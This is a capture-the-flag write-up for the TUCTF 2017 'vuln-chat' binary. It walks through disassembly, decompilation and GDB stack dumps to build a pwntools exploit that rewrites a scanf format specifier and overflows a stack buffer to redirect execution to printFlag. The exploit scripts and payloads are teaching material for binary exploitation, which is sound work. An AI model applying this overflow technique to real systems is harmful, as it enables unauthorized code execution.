# Tuctf17 Vulnchat

Wheni we check the security of the binaruy we see its a 32-bit executable compiled without security protections: 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/CallFunction/Vulnchat$ file vuln-chat && checksec vuln-chat
vuln-chat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a3caa1805eeeee1454ee76287be398b12b5fa2b7, not stripped
[*] '/home/root-at-iyn/Nightmare/BufferOverflow/CallFunction/Vulnchat/vuln-chat'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

```

I'll disassemble the program to understand what it does:

```bash
gef➤  disass main
Dump of assembler code for function main:
   
   0x0804858a <+0>:	push   ebp
   0x0804858b <+1>:	mov    ebp,esp
   0x0804858d <+3>:	sub    esp,0x30
   0x08048590 <+6>:	mov    eax,ds:0x8049a60
   0x08048595 <+11>:	push   0x14
   0x08048597 <+13>:	push   0x2
   0x08048599 <+15>:	push   0x0
   0x0804859b <+17>:	push   eax
   0x0804859c <+18>:	call   0x8048450 <setvbuf@plt>
   0x080485a1 <+23>:	add    esp,0x10
   0x080485a4 <+26>:	push   0x8048714
   0x080485a9 <+31>:	call   0x8048410 <puts@plt>
   0x080485ae <+36>:	add    esp,0x4
   0x080485b1 <+39>:	push   0x8048743
   0x080485b6 <+44>:	call   0x80483e0 <printf@plt>
   0x080485bb <+49>:	add    esp,0x4
   0x080485be <+52>:	mov    DWORD PTR [ebp-0x5],0x73303325
   0x080485c5 <+59>:	mov    BYTE PTR [ebp-0x1],0x0
   0x080485c9 <+63>:	lea    eax,[ebp-0x19]
   0x080485cc <+66>:	push   eax
   0x080485cd <+67>:	lea    eax,[ebp-0x5]
   0x080485d0 <+70>:	push   eax
   0x080485d1 <+71>:	call   0x8048460 <__isoc99_scanf@plt>
   0x080485d6 <+76>:	add    esp,0x8
   0x080485d9 <+79>:	lea    eax,[ebp-0x19]
   0x080485dc <+82>:	push   eax
   0x080485dd <+83>:	push   0x8048759
   0x080485e2 <+88>:	call   0x80483e0 <printf@plt>
   0x080485e7 <+93>:	add    esp,0x8
   0x080485ea <+96>:	push   0x8048766
   0x080485ef <+101>:	call   0x8048410 <puts@plt>
   0x080485f4 <+106>:	add    esp,0x4
   0x080485f7 <+109>:	push   0x1
   0x080485f9 <+111>:	call   0x8048400 <sleep@plt>
   0x080485fe <+116>:	add    esp,0x4
   0x08048601 <+119>:	push   0x804877c
   0x08048606 <+124>:	call   0x8048410 <puts@plt>
   0x0804860b <+129>:	add    esp,0x4
   0x0804860e <+132>:	push   0x80487a4
   0x08048613 <+137>:	call   0x8048410 <puts@plt>
   0x08048618 <+142>:	add    esp,0x4
   0x0804861b <+145>:	lea    eax,[ebp-0x19]
   0x0804861e <+148>:	push   eax
   0x0804861f <+149>:	push   0x80487e6
   0x08048624 <+154>:	call   0x80483e0 <printf@plt>
   0x08048629 <+159>:	add    esp,0x8
   0x0804862c <+162>:	lea    eax,[ebp-0x2d]
   0x0804862f <+165>:	push   eax
   0x08048630 <+166>:	lea    eax,[ebp-0x5]
   0x08048633 <+169>:	push   eax
   0x08048634 <+170>:	call   0x8048460 <__isoc99_scanf@plt>
   0x08048639 <+175>:	add    esp,0x8
   0x0804863c <+178>:	push   0x80487ec
   0x08048641 <+183>:	call   0x8048410 <puts@plt>
   0x08048646 <+188>:	add    esp,0x4
   0x08048649 <+191>:	mov    eax,ds:0x8049a60
   0x0804864e <+196>:	push   eax
   0x0804864f <+197>:	call   0x80483f0 <fflush@plt>
   0x08048654 <+202>:	add    esp,0x4
   0x08048657 <+205>:	mov    eax,0x0
   0x0804865c <+210>:	leave  
   0x0804865d <+211>:	ret    
End of assembler dump.

```

Looking at the disassembly: 
- There's a call to setvbuf with a stream defined at 0x8049a60, a buffer of 0x0, mode 0x2 and size of 0x14 (20 bytes)
- At main<+41> there's a call to puts with arg of 0x8048714
- After the call to puts a string from 0x8048743 is passed to printf 
- Next we see 0x73303325 moved to ebp-0x5 and 0x0 to ebp-0x1
- At main<+71> `scanf` is called with 2 args, ebp-0x5 and ebp-0x19. It's likely that ebp-0x19 if the buffer and ebp-0x5 is the format string.
- Next, the string received in ebp-0x19 is passed to printf along with 0x8048759 
- We see another call to puts with 0x8048766 as an arg
- Next we see a call to sleep with an arg of 0x1. We can infer the program will sleep for 1 second here.
- After this there are further calls to puts with 0x804877c, and 0x80487a4 as arguments
- Printf is called again with ebp-0x19 and 0x80487e6 as an argument. Again this will be the data received by scanf and a format string specifier.
- After this call ebp-0x2d and ebp-0x5 are passed to `scanf`
- Puts is called with 0x80487ec as an arg
- Finally fflush is called with an arg of 0x8049a60, which will flush the stream (buffered data) at 0x8049a60

This is a longer program and prints a lot more information to the terminal. It receives user input at two seperate points in the program via scanf. There are no conditionals so we don't need to do something in particular to get another section of the code to run, the program will complete in a linear fashion. At this point we'll run the binary and see what it prints out: 


```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/CallFunction/Vulnchat$ ./vuln-chat 
----------- Welcome to vuln-chat -------------
Enter your username: root
Welcome root!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
root: yes
djinn: Sorry. That's not good enough

```
So you it prompts for a username, I just typed root because hey what the heck :D. After this it simulates a chat and asks " ... can I trust you" then presents another prompt with the  username you entered previously while waiting for user input as a response. I typed "yes" and the response was "Sorry. That's not good enough". It makes sense now why we saw so many calls to printf and puts, and we now see why there are 2 scanf calls. With the current information I think we're probably going to be looking at trying to overflow one of the scanf buffers, but lets see what else we can find by looking at the decompilation in ghidra: 

```c
undefined4 main(void)

{
  undefined1 local_31 [20];
  undefined1 local_1d [20];
  undefined4 local_9;
  undefined1 local_5;

  setvbuf(stdout,(char *)0x0,2,0x14);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  local_9 = 0x73303325;
  local_5 = 0;
  __isoc99_scanf(&local_9,local_1d);
  printf("Welcome %s!\n",local_1d);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ",local_1d);
  __isoc99_scanf(&local_9,local_31);
  puts("djinn: Sorry. That\'s not good enough");
  fflush(stdout);
  return 0;
}

```

From the C pseudo code it is clear that both calls to scanf use buffers that 20 bytes in size. Since scanf does not enforce a size limit on how many bytes are read in, we will be able to overflow the buffer. In ghidra we can see another function in the symbol tree named `printFlag`

```c

void printFlag(void)

{
  system("/bin/cat ./flag.txt");
  puts("Use it wisely");
  return;
}

```

So it looks like we have to call printFlag to print the flag for the challenge, and since main does not directly call printFlag, we'll have to overwrite the return address of main with address of printFlag `0804856b`. In the first call to scanf our input should be stored at ebp-0x19 , so I would expect if we send 25 bytes to be at ebp, add another 4 bytes to overwrite ebp, and finally another 4 bytes for the instruction pointer. Let's test in gdb by sending 25 A's and 3 B's + \n char. If we're correct we should see the B's in ebp. I'll break on main<+210>:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/CallFunction/Vulnchat$ python3 -c "print('A' * 25 + 'B'*3)"
AAAAAAAAAAAAAAAAAAAAAAAAABBB
```

```bash
gef➤  x/16wx $esp
0xffffd0c8:	0xf7d934be	0xf7fbe4a0	0xffffd110	0xf7fbe66c
0xffffd0d8:	0xf7fbeb10	0x41000001	0x41414141	0x41414141
0xffffd0e8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd0f8:	0x00424242	0xf7d9c519	0x00000001	0xffffd1b4
gef➤  info frame
Stack level 0, frame at 0xffffd100:
 eip = 0x804865c in main; saved eip = 0xf7d9c519
 Arglist at 0xffffd0f8, args: 
 Locals at 0xffffd0f8, Previous frame's sp is 0xffffd100
 Saved registers:
  ebp at 0xffffd0f8, eip at 0xffffd0fc

```

So it looks like we're right, the saved return address is 0xf7d9c519 and right before this we see the 3 B's (0x00424242) terminated with a null character 0x00. Now we create a python script that replicates this and appends the return address of printFlag. 

```python
from pwn import *

target = process("./vuln-chat")

gdb.attach(target)

payload = b"A" * 25 + b"B" * 4 + p32(0x804856b)

target.send(payload)

target.interactive()

```

When we run the script and check the stack in gdb, we can see that the return address is incorrect and has clearly changed from what we input:

```bash
gef➤  x/16wx $esp
0xffb72bb0:	0xffb72be3	0xffb72bcf	0xf62e84be	0xf65134a0
0xffb72bc0:	0xffb72c00	0xf651366c	0xf6513b10	0x41000001
0xffb72bd0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffb72be0:	0x41414141	0x41414141	0x42424242	0xf62f006b
```
The return address now shows as `0xf62f006b` which is wrong. 


If we investigate what happens when we call scanf, we can see a value is passed as a format specifier `0x73303325`. We need to see what this maps to. We'll use pwntools to get the byte string: 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Offensive-Security/Exploit-Dev/CTF-Labs/Nightmare$ python3 -c "from pwn import *; print(p32(0x73303325))"
b'%30s'
```
So this looks like a string format specifier that will be applied to the bytes scanf receives. If we look this up in the man page we see the following regarding format specifier directives preceeded with an integer:
> An  optional  decimal integer which specifies the maximum field width.  Reading of characters stops either when this maximum is reached or when a nonmatching character is found, whichever happens first.

So what appears to be happening here is that when we send input to scanf it will only read 30 bytes because of the format specifier. To get past this issue we'll have to send 20 bytes to get to ebp-0x5 and then append it with an increased format specifier. It makes sense why there's another call to scanf now. We'll have to perform the exploit that modifies main's return address to printFlag in the 2nd call to scanf. Looking at the assembly we see the input received in the 2nd call to scanf is stored in ebp-0x2d, so we can infer that sending 45 bytes should take us to ebp, plus another 4 bytes to overwrite ebp, then we append the address of printFlag. I'll modify the python script and then retest in gdb:


```python
from pwn import *

target = process("./vuln-chat")

gdb.attach(target, gdbscript="b *main")

payload = b"A" * 20 + b"%53s" # p32(0x804856b)
print(payload)

target.sendline(payload)

print(target.recvuntil(b"you?"))

payload2 = b"B" * 49 + p32(0x804856b)

target.sendline(payload2)

target.interactive()

```

```bash
gef➤  x/20wx $esp
0xff9c60b0:	0xff9c60e3	0xff9c60bb	0x42cb74be	0x42424242
0xff9c60c0:	0x42424242	0x42424242	0x42424242	0x42424242
0xff9c60d0:	0x42424242	0x42424242	0x42424242	0x42424242
0xff9c60e0:	0x42424242	0x42424242	0x42424242	0x0804856b
0xff9c60f0:	0x00000000	0xff9c61a4	0xff9c61ac	0xff9c6110
gef➤  info frame
Stack level 0, frame at 0xff9c60f0:
 eip = 0x8048639 in main; saved eip = 0x804856b
 Arglist at 0xff9c60e8, args: 
 Locals at 0xff9c60e8, Previous frame's sp is 0xff9c60f0
 Saved registers:
  ebp at 0xff9c60e8, eip at 0xff9c60ec

```
This is much better! we can see that the return address now points to 0x0804856b which is the start of printFlag. If we continue to step through the debugging session we'll see the instructions for printFlag:

```bash
─────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048654 <main+00ca>      add    esp, 0x4
    0x8048657 <main+00cd>      mov    eax, 0x0
    0x804865c <main+00d2>      leave  
 →  0x804865d <main+00d3>      ret    
   ↳   0x804856b <printFlag+0000> push   ebp
       0x804856c <printFlag+0001> mov    ebp, esp
       0x804856e <printFlag+0003> push   0x80486f0
       0x8048573 <printFlag+0008> call   0x8048420 <system@plt>
       0x8048578 <printFlag+000d> add    esp, 0x4
       0x804857b <printFlag+0010> push   0x8048704

```
If we run the script without the debugging session we see the flag printed:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/CallFunction/Vulnchat$ python3 exploit_vulnchat.py
[+] Starting local process './vuln-chat': pid 11312
[*] running in new terminal: ['/usr/bin/gdb', '-q', './vuln-chat', '-p', '11312', '-x', '/tmp/pwnlib-gdbscript-d30v1fdv.gdb']
[+] Waiting for debugger: Done
b'AAAAAAAAAAAAAAAAAAAA%53s'
b"----------- Welcome to vuln-chat -------------\nEnter your username: Welcome AAAAAAAAAAAAAAAAAAAA%53s!\nConnecting to 'djinn'\n--- 'djinn' has joined your chat ---\ndjinn: I have the information. But how do I know I can trust you?"
[*] Switching to interactive mode

AAAAAAAAAAAAAAAAAAAA%53s: djinn: Sorry. That's not good enough
flag{g0ttem_b0yz}
Use it wisely

```
